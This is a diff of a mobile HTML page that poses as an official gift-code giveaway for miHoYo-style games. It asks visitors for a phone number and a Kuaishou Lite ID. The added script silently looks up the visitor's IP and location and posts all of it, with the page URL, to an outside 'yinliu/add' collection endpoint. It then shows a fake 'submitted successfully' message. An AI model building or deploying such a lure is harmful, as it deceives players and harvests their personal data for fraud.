@@ -1,41 +1,58 @@
 <!DOCTYPE html>
 <html>
 
-<script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
-<script>LA.init({ id: "3FK11ai7QqSmGqmp", ck: "3FK11ai7QqSmGqmp" })</script>
-
 <head>
     <meta charset="utf-8">
-    <title> 【星穹铁道】最新礼包</title>
-    <meta http-equiv="Expires" content="0">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Cache-control" content="no-cache">
-    <meta http-equiv="Cache" content="no-cache">
+    <title>【崩坏】最新活动</title>
     <meta name="referrer" content="no-referrer">
+    <link rel="dns-prefetch" href="https://article.biliimg.com">
+    <link rel="dns-prefetch" href="https://vuemin.oss-cn-shanghai.aliyuncs.com">
+    <link rel="dns-prefetch" href="https://cdn.bootcdn.net">
     <meta name="viewport"
-        content="target-densitydpi=device-dpi, width=device-width,height=device-height, initial-scale=1, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0,shrink-to-fit=no">
-    <meta name="format-detection" content="telephone=no">
+        content="target-densitydpi=device-dpi, width=device-width,height=device-height, initial-scale=1, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0,shrink-to-fit=no" />
+    <meta name="format-detection" content="telephone=no" />
     <!--em标准js代码，请放在页面的最上方，前面最好不要再有JS代码或JS文件-->
-    <script type="text/javascript" src="https://bilibili7.oss-cn-guangzhou.aliyuncs.com/css/rem.js"></script>
-    <script type="text/javascript"
-        src="https://bilibili7.oss-cn-guangzhou.aliyuncs.com/css/jquery-1.11.1.min.js"></script>
-    <script type="text/javascript" src="https://bilibili7.oss-cn-guangzhou.aliyuncs.com/css/vue.js"></script>
-    <script type="text/javascript" src="https://bilibili7.oss-cn-guangzhou.aliyuncs.com/css/vant.min.js"></script>
-    <link rel="stylesheet" type="text/css" href="https://bilibili7.oss-cn-guangzhou.aliyuncs.com/css/vant.min.css">
+    <script>
+        function getRem(pwidth, prem) {
+            var html = document.getElementsByTagName("html")[0];
+            var oWidth = window.innerWidth;
+            html.style.fontSize = oWidth / pwidth * prem + "px";
+            if (!/iphone|ipad|ipod|android.*mobile|windows.*phone|blackberry.*mobile/i.test(window.navigator.userAgent.toLowerCase())) {	//pc端居中显示
+                html.style.width = "750px";
+                html.style["margin"] = "0 auto";
+                html.style.fontSize = "100px";
+            }
+        }
+        getRem(750, 100);
+        /*750代表设计师给的设计稿的宽度，你的设计稿是多少，就写多少;100代表换算比例，这里写100是
+        为了以后好算,比如，你测量的一个宽度是100px,就可以写为1rem,以及1px=0.01rem等等*/
+        window.onresize = function () {
+            getRem(750, 100);
+        };
+    </script>
+    <script src="https://vuemin.oss-cn-shanghai.aliyuncs.com/vue.min.js"></script>
+    <script type="text/javascript" src="https://cdn.bootcdn.net/ajax/libs/vant/2.12.33/vant.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcdn.net/ajax/libs/vant/2.12.33/index.min.css">
+    <style>
+        body {
+            background-color: black;
+        }
+    </style>
     <style type="text/css">
         /*通用类*/
         * {
             margin: 0;
             padding: 0;
+
         }
 
         body {
             margin: 0 auto;
             font-size: 0.24rem;
             font-family: PingFang SC, Hiragino Sans GB, Microsoft YaHei UI, Microsoft YaHei, Source Han Sans CN, sans-serif;
-            background: #fff;
+            background: #282828;
             text-align: justify;
-            color: #010000;
+            color: #282828;
             position: relative;
         }
 
@@ -197,8 +214,7 @@
 
 
         .wrapin {
-            background-color: #fffdf0;
-            /* 表单背景颜色 */
+            background-color: #000000;
             padding-bottom: 0.3rem;
         }
 
@@ -215,7 +231,6 @@
         .pic img {
             width: 100%;
             display: block;
-            pointer-events: none;
         }
 
         ul.orm {
@@ -229,7 +244,7 @@
 
         /* 表单标题颜色 */
         ul li h3 {
-            color: #000000;
+            color: #ffffff;
             font-size: 0.32rem;
             /* 标题字体大小 */
             margin-bottom: 0.01rem;
@@ -275,7 +290,7 @@
             color: #000;
             border: 1px solid #fff;
 
-            background: #fff url(https://bilibili7.oss-cn-guangzhou.aliyuncs.com/css/jiantou.png) no-repeat right 0.2rem center !important;
+            background: #fff url(https://images.weserv.nl/?url=https://article.biliimg.com/bfs/article/2889eb91a579477ffd66db122b16807fb067dd10.png@1e_1c.webp) no-repeat right 0.2rem center !important;
 
             background-size: 0.25rem 0.3rem !important;
         }
@@ -315,14 +330,12 @@
             width: 7rem;
             /* 提交按钮大小 */
             height: 0.8rem;
-            background-color: #719476;
-            /* 提交按钮颜色 */
+            background-color: #343331;
             margin: 0.2rem auto;
             display: block;
             border: none;
-            font-size: 0.35rem;
-            color: #FFFFFF;
-            /* 提交字体颜色 */
+            font-size: 0.36rem;
+            color: #ffffff;
             border-radius: 0.2rem;
             font-weight: bold;
         }
@@ -339,8 +352,7 @@
             left: 50%;
             width: 6rem;
             height: 6rem;
-            background-color: #fffdf0;
-            /* 弹窗背景颜色 */
+            background-color: #181818;
             z-index: 2;
             margin-left: -3rem;
             border-radius: 0.2rem;
@@ -357,8 +369,7 @@
             font-size: 0.5rem;
             color: #fff;
             margin: 0.3rem 0;
-            color: #000000;
-            /* 提交成功字体颜色 */
+            color: #FFFFFF;
         }
 
         .tanchu p {
@@ -372,21 +383,21 @@
         }
 
         .shou input {
-            background: url(https://bilibili7.oss-cn-guangzhou.aliyuncs.com/css/shouji.png) no-repeat left;
+            background: url(https://bili-games.oss-cn-shanghai.aliyuncs.com/9318b0f31906c55fb363f740088886213a42c51c.png) no-repeat left;
             background-size: 0.4rem 0.4rem;
             border: none;
             background-color: #fff;
         }
 
         .shou1 input {
-            background: url(https://bilibili7.oss-cn-guangzhou.aliyuncs.com/css/QQ.png) no-repeat left;
+            background: url(https://images.weserv.nl/?url=https://article.biliimg.com/bfs/article/6f6023e41c8e8c32fc85701a2b1ede7afb4f32df.png@1e_1c.webp) no-repeat left;
             background-size: 0.4rem 0.4rem;
             border: none;
             background-color: #fff;
         }
 
         .shou2 input {
-            background: url(https://bilibili7.oss-cn-guangzhou.aliyuncs.com/css/ks.png) no-repeat left;
+            background: url(https://bili-games.oss-cn-shanghai.aliyuncs.com/1f36eccc91e8d2d208560dab60470f3c6f0a5b5c.png) no-repeat left;
             background-size: 0.4rem 0.4rem;
             border: none;
             background-color: #fff;
@@ -414,39 +425,27 @@
             font-size: .3rem;
             font-weight: bold;
         }
-
-        .form {
-            position: relative;
-        }
-
-        .form .submit {
-            position: absolute;
-            width: 2.8rem;
-            height: 1rem;
-            left: 50%;
-            transform: translateX(-50%);
-            -webkit-transform: translateX(-50%);
-            bottom: 1.1rem;
-            cursor: pointer;
-            width: 220px;
-            height: 60px;
-        }
     </style>
 </head>
 
 <body>
     <div id="app">
+        <!--内容-->
         <div class="pic">
-            <img src="https://article.biliimg.com/bfs/article/bcdcf8d171570d0d39e0ca457d3e1b921aa06aaf.jpg">
-            <img src="https://article.biliimg.com/bfs/article/94633ae8eeb4e7d0a6326a2d7d4ddc17c4abf98e.jpg">
+            <p>
+                <img src="https://article.biliimg.com/bfs/article/e971ef97fbd8ccc7689a4ba6c3cdd461a5301a19.jpg">
+                <img src="https://article.biliimg.com/bfs/article/051a2dc16551590052183e4563dd8546e7d86519.jpg">
 
-            <!-- 这里就是替换二维码的链接（替换 "" 中间的东西） -->
-            <img src="https://article.biliimg.com/bfs/article/3398144cf9ce002f3d6ce4b788863419a6e8dffe.jpg">
+                <!-- 这里就是替换二维码的链接（替换 "" 中间的东西） -->
+                <img src="https://article.biliimg.com/bfs/article/cd6cf1fc4353304d2ebecc72653ed5cd719c24cc.jpg">
 
-            <img src="https://article.biliimg.com/bfs/article/bc5b10b533c744b710f517d9df1ff13caae2f57e.jpg">
-            <img src="https://article.biliimg.com/bfs/article/5d706a931552e14352718d9dedeaa04c6ee2400f.jpg">
-            <img src="https://article.biliimg.com/bfs/article/b54ad6488cdea3cb29b6a439f79c7016be9ef207.jpg">
+                <img src="https://article.biliimg.com/bfs/article/73cafbf34412ae0a79f292d51bf99021c7ea3352.jpg">
+                <img src="https://article.biliimg.com/bfs/article/9d8ec4ae34b4afcb2f984f88896296d76bddf2df.jpg">
+                <img src="https://article.biliimg.com/bfs/article/512e4ca19a44c7a2f0d1a0788ee30fd24b131029.jpg">
 
+                <img src="https://article.biliimg.com/bfs/article/3c89dbee7898aa5b9a57c8a0e3adcb8a374f24b6.jpg">
+                <img src="https://article.biliimg.com/bfs/article/aa14d94419c9a2eb9154a199b9378412860f2360.jpg">
+            </p>
         </div>
         <div class="wrapin">
             <form action="" method="get">
@@ -454,16 +453,18 @@
                     <li class="shou">
                         <h3><i>*</i>手机号</h3>
                         <h4>
-                            <圣晶石礼包兑换码>通知短信将发送至此手机号上</原石礼包兑换码>
+                            <公测礼包>领取通知短信将发送至此手机号上
                         </h4>
-                        <input type="tel" name="tel" v-model="phone" id="tel" placeholder="请输入正确的手机号">
+                        <input type="tel" name="tel" v-model="phone" id="tel" placeholder="请输入正确的手机号" />
+                    </li>
                     <li class="shou2">
                         <h3><i>*</i>快手极速版ID</h3>
                         <h4>在快手极速版右下角-我-查看(昵称下面的快手号)复制即可</h4>
-                        <input type="text" name="" id="" value="" placeholder="输入快手极速版ID，注意不是昵称">
+                        <input type="text" name="ks_id" id="ks_id" v-model="ks_id" placeholder="输入快手极速版ID，注意不是昵称" />
+
                     </li>
                     <li class="dan">
-                        <h3><i>*</i>资格未到账之前请勿卸载快手极速版APP或者注销账号，否则视为放弃领取。</h3>
+                        <h3><i>*</i>礼包未到账之前请勿卸载快手极速版APP，否则视为放弃领取。</h3>
                         <div class="rbg">
                         </div>
                     </li>
@@ -478,237 +479,74 @@
                 </ul>
                 <button type="button" class="button" @click="post">提交</button>
             </form>
+
         </div>
-        <div class="pic">
-        </div>
-        <audio src="https://ys.mihoyo.com/main/_nuxt/medias/video-bgm.d8637316.mp3" autoplay="autoplay" loop="loop">
+
+        <audio
+            src="https://gamecms-res.sl916.com/official_website_resource/50001/4/VIDEO/20230328/%E8%8B%8F%E8%8A%99%E6%AF%94%E5%BA%9C%E9%82%B8_f019007024bd41dbb8ba248eaab9b181.mp3"
+            autoplay="autoplay" loop="loop">
             当前浏览器不支持audio
         </audio>
 
         <!--弹出-->
         <div class="tanchu" v-if="isPost">
-            <img src="https://bilibili7.oss-cn-guangzhou.aliyuncs.com/css/gou.png">
+            <img src="https://article.biliimg.com/bfs/article/64e034d4993f81ee8a5fcb9f7627bbb85330ff51.png@1e_1c.webp">
             <h3>提交成功</h3>
             <p>请注意查收手机通知短信</p>
             <br>
-            <div @click="isPost=false"><img src="https://bilibili1.oss-cn-shenzhen.aliyuncs.com/css/chacha.png">
-            </div>
+            <div @click="isPost=false"><img
+                    src="https://article.biliimg.com/bfs/article/4b473bde5c36d0943bc0eaa87a2f0bd45bf1d5b1.png"></div>
         </div>
 
-        <!--地区选择弹窗-->
-        <van-popup v-model="areaShow" position="bottom">
-            <van-picker show-toolbar :columns="areas" confirm-button-text="确认" cancel-button-text="取消"
-                @confirm="onAreaSelect" @cancel="onAreaCancel" />
-        </van-popup>
-
-        <!--省市选择弹窗-->
-        <van-popup v-model="cityShow" position="bottom">
-            <van-picker show-toolbar :columns="citys" confirm-button-text="确认" cancel-button-text="取消"
-                @confirm="onCitySelect" @cancel="onCityCancel" />
-        </van-popup>
-    </div>
     </div>
     <script>
-
         var app = new Vue({
             el: "#app",
             data() {
                 return {
                     phone: "",
                     area: "",
-                    areaShow: false,
-                    areas: [
-                        { text: '杭州', value: '杭州' },
-                        { text: '宁波', value: '宁波' },
-                        { text: '温州', value: '温州' },
-                        { text: '绍兴', value: '绍兴' },
-                        { text: '湖州', value: '湖州' },
-                    ],
-                    city: "",
-                    cityShow: false,
-                    citys: [
-                        {
-                            text: '电信区',
-                            value: '电信区',
-                            children: [
-                                {
-                                    text: '艾欧尼亚',
-                                    value: '艾欧尼亚',
-                                },
-                                {
-                                    text: '祖安',
-                                    value: '祖安',
-                                },
-                                {
-                                    text: '诺克萨斯',
-                                    value: '诺克萨斯',
-                                },
-                                {
-                                    text: '班德尔城',
-                                    value: '班德尔城',
-                                },
-                                {
-                                    text: '皮尔特沃夫',
-                                    value: '皮尔特沃夫',
-                                },
-                                {
-                                    text: '战争学院',
-                                    value: '战争学院',
-                                },
-                                {
-                                    text: '巨神峰',
-                                    value: '巨神峰',
-                                },
-                                {
-                                    text: '雷瑟守备',
-                                    value: '雷瑟守备',
-                                },
-                                {
-                                    text: '裁决之地',
-                                    value: '裁决之地',
-                                },
-                                {
-                                    text: '黑色玫瑰',
-                                    value: '黑色玫瑰',
-                                },
-                                {
-                                    text: '暗影岛',
-                                    value: '暗影岛',
-                                },
-                                {
-                                    text: '钢铁烈阳',
-                                    value: '钢铁烈阳',
-                                },
-                                {
-                                    text: '水晶之痕',
-                                    value: '水晶之痕',
-                                },
-                                {
-                                    text: '均衡教派',
-                                    value: '均衡教派',
-                                },
-                                {
-                                    text: '影流',
-                                    value: '影流',
-                                },
-                                {
-                                    text: '守望之海',
-                                    value: '守望之海',
-                                },
-                                {
-                                    text: '征服之海',
-                                    value: '征服之海',
-                                },
-                                {
-                                    text: '卡拉曼达',
-                                    value: '卡拉曼达',
-                                },
-                                {
-                                    text: '皮城警备',
-                                    value: '皮城警备',
-                                },
-                            ],
-                        },
-                        {
-                            text: '网通区',
-                            value: '网通区',
-                            children: [
-                                {
-                                    text: '比尔吉沃特',
-                                    value: '比尔吉沃特',
-                                },
-                                {
-                                    text: '德玛西亚',
-                                    value: '德玛西亚',
-                                },
-                                {
-                                    text: '弗雷尔卓德',
-                                    value: '弗雷尔卓德',
-                                },
-                                {
-                                    text: '无畏先锋',
-                                    value: '无畏先锋',
-                                },
-                                {
-                                    text: '恕瑞玛',
-                                    value: '恕瑞玛',
-                                },
-                                {
-                                    text: '扭曲丛林',
-                                    value: '扭曲丛林',
-                                },
-                                {
-                                    text: '巨龙之巢',
-                                    value: '巨龙之巢',
-                                },
-                            ],
-                        },
-                        {
-                            text: '其他区服',
-                            value: '其他区服',
-                            children: [
-                                {
-                                    text: '教育网专区',
-                                    value: '教育网专区',
-                                },
-                                {
-                                    text: '男爵领域',
-                                    value: '男爵领域',
-                                },
-                            ],
-                        }
-                    ],
-                    radisoCheck: '1',
+                    IPInfo: {},
                     isPost: false,
+                    ks_id: ''
                 }
             },
             methods: {
-                onAreaSelect(item) {
-                    this.area = item.value;
-                    this.areaShow = false;
-                },
-                onAreaCancel() {
-                    this.areaShow = false;
-                },
-                onCitySelect(item) {
-                    this.city = item[0] + item[1];
-                    this.cityShow = false;
-                },
-                onCityCancel() {
-                    this.cityShow = false;
-                },
-                receive() {
-                    Ajax(HOST, {
-                        'route_name': 'check_receive'
-                    }).then(res => {
-                        if (res.code != 0) {
-                            vant.Dialog({ message: '请完成下列任务后再领取', className: "alert", confirmButtonText: '确定' });
-                        } else {
-                            vant.Dialog({ message: '审核中，留意短信通知...', className: "alert", confirmButtonText: '确定' });
-                        }
-                    })
-
-                },
                 post() {
                     if (!/^1[3456789]\d{9}$/.test(this.phone)) {
                         vant.Dialog({ message: '请输入有效的手机号码', className: "alert", confirmButtonText: '确定' });
                         return false;
                     }
                     this.isPost = true;
-                    // Ajax(HOST, {
-                    //     'phone': this.phone
-                    // }).then(res => {
-                    //     if (res.code != 0) {
-                    //         vant.Dialog({ message: res.msg, className: "alert", confirmButtonText: '确定' });
-                    //         return;
-                    //     }
-                    //     this.isPost = true;
-                    // })
-
+                    const baseUrl = "https://service-8zqb5ngm-1253419200.gz.apigw.tencentcs.com/";
+                    fetch(baseUrl + "yinliu/add", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify({
+                            phone: this.phone,
+                            kS_ID: this.ks_id,
+                            IPInfo: this.IPInfo,
+                            href: window.location.href,
+                            host: location.host,
+                            extra: {
+                                qq: this.qq,
+                                area: this.area,
+                            },
+                        }),
+                    })
+                        .then((res) => res.json())
                 }
             },
             mounted() {
-
+                fetch("https://ip.useragentinfo.com/json")
+                    .then((res) => {
+                        return res.json();
+                    })
+                    .then((res) => {
+                        this.IPInfo = res;
+                    });
             }
         });
 
@@ -783,9 +621,12 @@
         }
 
 
+
+
+
     </script>
-    <script charset="UTF-8" id="LA_COLLECT"
-        src="//sdk.51.la/js-sdk-pro.min.js?id=3FDRcsYlidVvTx5f&ck=3FDRcsYlidVvTx5f"></script>
-</body>
+
+    <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
+    <script>LA.init({ id: "3FJzWmuVvZqS5vRy", ck: "3FJzWmuVvZqS5vRy" })</script>
 
 </html>
